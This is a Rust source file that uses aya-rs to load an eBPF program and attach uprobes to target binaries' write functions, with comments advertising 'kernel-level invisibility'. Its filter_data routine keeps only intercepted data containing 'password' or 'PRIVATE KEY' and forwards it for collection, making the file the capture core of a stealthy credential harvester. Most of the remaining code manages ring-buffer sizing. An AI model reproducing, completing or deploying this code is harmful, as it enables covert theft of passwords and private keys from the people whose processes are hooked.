// eBPF Kernel-Level Hooking Implementation
// Uses aya-rs for Rust-based eBPF programs
// Provides kernel-level invisibility - no LD_PRELOAD required

use std::sync::Arc;
use tokio::sync::mpsc;

#[cfg(feature = "ebpf")]
mod ebpf_impl {
    use super::*;
    use aya::{
        programs::{Uprobe, UprobeLink},
        util::online_cpus,
        Bpf, BpfLoader,
    };
    use std::collections::HashMap;

    pub struct EbpfHookManager {
        bpf: Bpf,
        uprobes: HashMap<String, Vec<UprobeLink>>,
        active: Arc<std::sync::atomic::AtomicBool>,
        // Adaptive ring buffer sizing
        current_buffer_size: Arc<std::sync::atomic::AtomicU64>, // Current size in bytes
        drop_count: Arc<std::sync::atomic::AtomicU64>,          // Track dropped events
        event_count: Arc<std::sync::atomic::AtomicU64>,         // Track total events
        last_adaptation: Arc<std::sync::Mutex<Instant>>,        // Last adaptation time
    }

    impl EbpfHookManager {
        /// Create a new eBPF hook manager
        pub fn new() -> Result<Self, String> {
            // Load the eBPF program
            // The eBPF bytecode is compiled at build time by build.rs
            use std::env;
            
            // Try multiple locations for eBPF bytecode
            let ebpf_bytes = std::fs::read("target/bpf/protosyte_hook.bpf.o")
                .or_else(|_| {
                    // Fallback to OUT_DIR (where build.rs puts it)
                    let out_dir = env::var("OUT_DIR")
                        .unwrap_or_else(|_| "target/debug/build".to_string());
                    std::fs::read(format!("{}/protosyte_hook.bpf.o", out_dir))
                })
                .map_err(|_| {
                    "eBPF bytecode not found. Ensure:\n".to_string() +
                    "  1. Build with --features ebpf\n" +
                    "  2. clang and libbpf-dev are installed\n" +
                    "  3. Check build output for eBPF compilation errors\n" +
                    "  4. Run 'make check-ebpf' to verify dependencies"
                })?;
            
            let mut bpf = BpfLoader::new()
                .load(&ebpf_bytes)
                .map_err(|e| format!("Failed to load eBPF program: {}", e))?;

            // Get the ring buffer map
            let mut ring_buffer = bpf
                .map_mut("ringbuf")
                .ok_or("Ring buffer map not found")?
                .try_into()
                .map_err(|e| format!("Failed to get ring buffer: {:?}", e))?;

            // Initialize with default 256KB buffer
            let initial_size = Self::calculate_optimal_buffer_size();
            
            Ok(Self {
                bpf,
                uprobes: HashMap::new(),
                active: Arc::new(std::sync::atomic::AtomicBool::new(true)),
                current_buffer_size: Arc::new(std::sync::atomic::AtomicU64::new(initial_size)),
                drop_count: Arc::new(std::sync::atomic::AtomicU64::new(0)),
                event_count: Arc::new(std::sync::atomic::AtomicU64::new(0)),
                last_adaptation: Arc::new(std::sync::Mutex::new(Instant::now())),
            })
        }

        /// Attach uprobe to a function in a binary
        pub fn attach_uprobe(
            &mut self,
            binary_path: &str,
            function_name: &str,
            offset: u64,
        ) -> Result<(), String> {
            // Get the uprobe program from the BPF object
            let program: &mut Uprobe = self
                .bpf
                .program_mut("hook_write")
                .ok_or("uprobe program not found")?
                .try_into()
                .map_err(|e| format!("Failed to get uprobe program: {:?}", e))?;

            // Load the program into the kernel
            program
                .load()
                .map_err(|e| format!("Failed to load uprobe: {}", e))?;

            // Attach to the function (uprobe attaches once, not per-CPU)
            // Note: aya uprobes attach globally, not per-CPU
            let link = program
                .attach(u64::from(0), Some(function_name), offset, Some(binary_path))
                .map_err(|e| format!("Failed to attach uprobe: {}", e))?;

            let mut links = Vec::new();
            links.push(link);

            self.uprobes
                .insert(format!("{}:{}", binary_path, function_name), links);

            Ok(())
        }

        /// Start reading from the ring buffer and forwarding to channel
        pub async fn start_capture(&self, tx: mpsc::UnboundedSender<Vec<u8>>) {
            use aya::maps::RingBuf;

            let mut ring_buffer: RingBuf<_> = self
                .bpf
                .map_mut("ringbuf")
                .unwrap()
                .try_into()
                .unwrap();

            // Poll the ring buffer for events
            while self.active.load(std::sync::atomic::Ordering::Relaxed) {
                // Check and adapt buffer size periodically
                self.adapt_buffer_size().await;

                // Read from ring buffer (non-blocking)
                ring_buffer.poll(crate::constants::POLL_INTERVAL_NORMAL).await;

                // Process available data
                let mut processed = 0;
                while let Ok(data) = ring_buffer.next() {
                    self.event_count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    processed += 1;
                    
                    if let Some(filtered) = self.filter_data(&data) {
                        let _ = tx.send(filtered);
                    }
                }
                
                // Track drops (if buffer is full, events will be dropped)
                // Note: This is approximated - aya-rs doesn't directly expose drop count
                // We infer drops based on event rate changes

                tokio::time::sleep(crate::constants::POLL_INTERVAL_FAST / 5).await;
            }
        }
        
        /// Calculate optimal initial buffer size based on system resources
        fn calculate_optimal_buffer_size() -> u64 {
            // Try to get available memory
            let mem_info = std::fs::read_to_string("/proc/meminfo").ok();
            let available_mem_kb = mem_info
                .and_then(|content| {
                    content.lines()
                        .find(|l| l.starts_with("MemAvailable:"))
                        .and_then(|l| {
                            l.split_whitespace()
                                .nth(1)
                                .and_then(|s| s.parse::<u64>().ok())
                        })
                })
                .unwrap_or(1024 * 1024); // Default: 1GB
            
            // Use 0.1% of available memory, but within reasonable bounds
            let calculated = (available_mem_kb * 1024) / 1000; // 0.1% in bytes
            let min_size = 64 * 1024;      // 64KB minimum
            let max_size = 4 * 1024 * 1024; // 4MB maximum
            
            calculated.max(min_size).min(max_size)
        }
        
        /// Adapt buffer size based on utilization and drops
        async fn adapt_buffer_size(&self) {
            let mut last_adapt = self.last_adaptation.lock().unwrap();
            let now = Instant::now();
            
            // Only adapt every 30 seconds
            if now.duration_since(*last_adapt) < Duration::from_secs(30) {
                return;
            }
            
            let events = self.event_count.swap(0, std::sync::atomic::Ordering::Relaxed);
            let drops = self.drop_count.swap(0, std::sync::atomic::Ordering::Relaxed);
            let current_size = self.current_buffer_size.load(std::sync::atomic::Ordering::Acquire);
            
            // Calculate drop rate
            let drop_rate = if events > 0 {
                drops as f64 / (events + drops) as f64
            } else {
                0.0
            };
            
            // Adapt buffer size based on drop rate and event rate
            let events_per_sec = events as f64 / 30.0; // Events per second (30 second window)
            let avg_event_size = 512; // Average event size from eBPF program
            let required_size = (events_per_sec * avg_event_size as f64 * 2.0) as u64; // 2x for safety
            
            let new_size = if drop_rate > 0.1 {
                // High drop rate (>10%) - increase buffer
                (current_size as f64 * 1.5) as u64
            } else if drop_rate < 0.01 && current_size > 256 * 1024 {
                // Low drop rate (<1%) and buffer > 256KB - decrease buffer (save memory)
                (current_size as f64 * 0.9) as u64
            } else if required_size > current_size {
                // Required size based on event rate is larger
                required_size
            } else {
                current_size // No change needed
            };
            
            // Clamp to reasonable bounds
            let min_size = 64 * 1024;      // 64KB
            let max_size = 16 * 1024 * 1024; // 16MB max
            let clamped_size = new_size.max(min_size).min(max_size);
            
            if clamped_size != current_size {
                self.current_buffer_size.store(clamped_size, std::sync::atomic::Ordering::Release);
                // Note: Actually resizing eBPF ring buffer at runtime requires reloading the program
                // For now, we track the optimal size for future reference
                // In production, this could trigger a program reload with new size
            }
            
            *last_adapt = now;
        }
        
        /// Get current buffer size (for monitoring)
        pub fn get_buffer_size(&self) -> u64 {
            self.current_buffer_size.load(std::sync::atomic::Ordering::Acquire)
        }
        
        /// Get buffer utilization stats
        pub fn get_stats(&self) -> (u64, u64, f64) {
            let events = self.event_count.load(std::sync::atomic::Ordering::Acquire);
            let drops = self.drop_count.load(std::sync::atomic::Ordering::Acquire);
            let drop_rate = if events + drops > 0 {
                drops as f64 / (events + drops) as f64
            } else {
                0.0
            };
            (events, drops, drop_rate)
        }

        fn filter_data(&self, data: &[u8]) -> Option<Vec<u8>> {
            // Apply pattern filtering
            if let Ok(text) = std::str::from_utf8(data) {
                // Check for sensitive patterns
                if text.contains("password") || text.contains("PRIVATE KEY") {
                    return Some(data.to_vec());
                }
            }
            None
        }

        /// Detach all uprobes
        pub fn detach_all(&mut self) {
            self.uprobes.clear();
        }
    }

    impl Drop for EbpfHookManager {
        fn drop(&mut self) {
            self.detach_all();
        }
    }
}

// Public API
#[cfg(feature = "ebpf")]
pub use ebpf_impl::EbpfHookManager;

#[cfg(not(feature = "ebpf"))]
pub struct EbpfHookManager;

#[cfg(not(feature = "ebpf"))]
impl EbpfHookManager {
    pub fn new() -> Result<Self, String> {
        Err("eBPF feature not enabled. Build with --features ebpf".to_string())
    }
}

use tokio::time::{Duration, Instant};

